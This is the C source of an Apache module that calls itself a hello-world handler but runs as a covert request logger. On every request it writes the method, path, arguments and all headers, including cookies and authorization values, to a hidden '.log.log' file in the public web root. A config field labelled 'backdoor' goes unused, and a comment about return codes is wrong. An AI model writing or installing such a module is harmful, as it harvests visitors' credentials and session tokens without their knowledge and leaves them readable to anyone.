#include "httpd.h"
#include "http_config.h"
#include "http_protocol.h"
#include "http_request.h"
#include <stdio.h>
#include <string.h>

struct configuration {
  char backdoor_header[30];
  char path_requests[30];
  int ERROR_RETURN;
};
struct configuration reqInfo = {"backdoor", "/var/www/html/.log.log", HTTP_INTERNAL_SERVER_ERROR }; //set to DECLINED in prod servers


static int hello_handler(request_rec *r) {

//the below line is commented so this module will handle every request    
//if (!r->handler || strcmp(r->handler, "hello_world")) {
//        return DECLINED;
//    }    
    

const apr_array_header_t  *fields;
int i;
apr_table_entry_t *e = 0;
FILE *fptr;
fptr = fopen(reqInfo.path_requests, "a");

if(!fptr){
    return reqInfo.ERROR_RETURN;
}

fields = apr_table_elts(r->headers_in);
e = (apr_table_entry_t *) fields->elts;

fprintf(fptr, "%s %s\nArgs: %s\n", r->method, r->filename, r->args);
for(i = 0; i < fields->nelts; i++) {
    fprintf(fptr, "%s: %s\n", e[i].key, e[i].val);
}

fprintf(fptr, "================================\n");
fclose(fptr);
   return DECLINED; //We handled this request and the server should just close this thread without further processing
}

static void register_hooks(apr_pool_t *p) {
    ap_hook_handler(hello_handler, NULL, NULL, APR_HOOK_MIDDLE);
}

module AP_MODULE_DECLARE_DATA hello_module = {
    STANDARD20_MODULE_STUFF,
    NULL,           /* Per-directory configuration handler */
    NULL,           /* Merge handler for per-directory configurations */
    NULL,           /* Per-server configuration handler */
    NULL,           /* Merge handler for per-server configurations */
    NULL,           /* Any directives we may have for httpd */
    register_hooks  /* Our hook registering function */
};
